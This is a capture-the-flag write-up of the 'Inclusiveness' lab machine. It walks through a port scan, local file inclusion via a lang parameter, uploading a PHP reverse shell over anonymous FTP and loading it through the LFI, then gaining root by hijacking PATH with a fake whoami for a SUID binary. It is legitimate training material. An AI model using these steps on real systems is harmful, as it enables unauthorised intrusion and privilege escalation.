---
title: Inclusiveness
categories: [Proving Grounds, Play]
tags: [FTP, LFI, PrivEsc]
image:
  path: https://miro.medium.com/v2/resize:fit:1200/1*fiNtXsFnX5MR7BPQV_wBvg.png
  alt:  Inclusiveness Machine 🖥️
---


### Lets check the IP address ➡️

![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled.png)

```bash
IP : 10.10.2.50
```
{: .nolineno}
{: .nolineno}

## Port Scan Results ➡️

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Inclusiveness]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.50
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 21:15 IST
Nmap scan report for 10.0.2.50
Host is up (0.00068s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub [NSE: writeable]
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 061ba39283a57a15bd406e0c8d98277b (RSA)
|   256 cb3883261a9fd35dd3fe9ba1d3bcab2c (ECDSA)
|_  256 6554fc2d12ace184783e0023fbe4c9ee (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:6F:A3:19 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}
{: .nolineno}

## Web Enumeration ➡️

![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled%201.png)

Lets see the directory listing files —>

![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled%202.png)

Now lets check the `robots.txt` file ➡️

![image_1.png](/Vulnhub-Files/img/Inclusiveness/image_1.png)

Now lets look at this directory —>

![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled%203.png)

Lets check for english link which leads me for directory traversal attack → `/etc/passwd` →

![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled%204.png)

Other than this I was unable to get any foothold into any internal directory files so I brute-force with LFI Injection payloads through burpsuite and I got this file —> `/etc/vsftpd.conf`

![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled%205.png)

Now I have also access with ftp so lets upload the reverse shell file in it —>

![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled%206.png)

Now I have uploaded the file in location /ftp/pub/shell.php lets load it and get my reverse shell →

URL —> `http://10.0.2.50/secret_information/?lang=/var/ftp/pub/shell.php`

In response to that I got this —>

![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled%207.png)

Now lets recon further ⤵️

```bash
www-data@inclusiveness:/home/tom$ ls -al
ls -al
total 100
drwxr-xr-x 15 tom  tom   4096 Feb  8  2020 .
drwxr-xr-x  3 root root  4096 Feb  8  2020 ..
-rw-------  1 tom  tom    684 Feb  8  2020 .ICEauthority
-rw-r--r--  1 tom  tom    220 Feb  8  2020 .bash_logout
-rw-r--r--  1 tom  tom   3526 Feb  8  2020 .bashrc
drwx------ 10 tom  tom   4096 Feb  8  2020 .cache
drwx------ 10 tom  tom   4096 Feb  8  2020 .config
drwx------  3 tom  tom   4096 Feb  8  2020 .gnupg
drwx------  3 tom  tom   4096 Feb  8  2020 .local
-rw-r--r--  1 tom  tom    807 Feb  8  2020 .profile
drwx------  2 tom  tom   4096 Feb  8  2020 .ssh
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Desktop
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Documents
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Downloads
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Music
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Pictures
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Public
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Templates
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Videos
-rwsr-xr-x  1 root root 16976 Feb  8  2020 rootshell
-rw-r--r--  1 tom  tom    448 Feb  8  2020 rootshell.c
www-data@inclusiveness:/home/tom$
```
{: .nolineno}
{: .nolineno}

Lets check the `rootshell` file which executes as root and I have access to read `rootshell.c` file →

```bash
www-data@inclusiveness:/home/tom$ cat rootshell.c
cat rootshell.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");

    char user[80];
    fgets(user, 80, f);

    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());

    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
	setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}

www-data@inclusiveness:/home/tom$
```
{: .nolineno}
{: .nolineno}

Now In this program whoami should be equal to tom to get our shell so I have to make whoami which says echo’s tom and it will execute accordingly →

```bash
www-data@inclusiveness:/home/tom$ cd /tmp
cd /tmp
www-data@inclusiveness:/tmp$ echo 'echo "tom"' >whoami
echo 'echo "tom"' >whoami
www-data@inclusiveness:/tmp$ cat whoami
cat whoami
echo "tom"
www-data@inclusiveness:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
www-data@inclusiveness:/tmp$ /home/tom/rootshell
/home/tom/rootshell
checking if you are tom...
you are: tom

access granted.
# /bin/bash -i
/bin/bash -i
root@inclusiveness:/tmp# whoami
whoami
tom
root@inclusiveness:/tmp# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
<l/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
root@inclusiveness:/tmp# whoami
whoami
root
root@inclusiveness:/tmp# cd ~
cd ~
root@inclusiveness:/root# ls -al
ls -al
total 64
drwx------  5 root root  4096 Feb  8  2020 .
drwxr-xr-x 19 root root  4096 Feb  8  2020 ..
-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc
drwx------  2 root root  4096 Feb  8  2020 .cache
-rw-------  1 root root    34 Feb  8  2020 .lesshst
drwxr-xr-x  3 root root  4096 Feb  8  2020 .local
-rw-r--r--  1 root root   148 Aug 18  2015 .profile
drwxr-xr-x  2 root root  4096 Feb  8  2020 .vim
-rw-------  1 root root 21141 Feb  8  2020 .viminfo
-rw-r--r--  1 root root    21 Feb  8  2020 .vimrc
-rw-r--r--  1 root root   141 Feb  8  2020 flag.txt
root@inclusiveness:/root# cat flag.txt
cat flag.txt
|\---------------\
||                |
|| UQ Cyber Squad |       
||                |
|\~~~~~~~~~~~~~~~\
|
|
|
|
o

flag{omg_you_did_it_YAY}
root@inclusiveness:/root#
```
{: .nolineno}

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }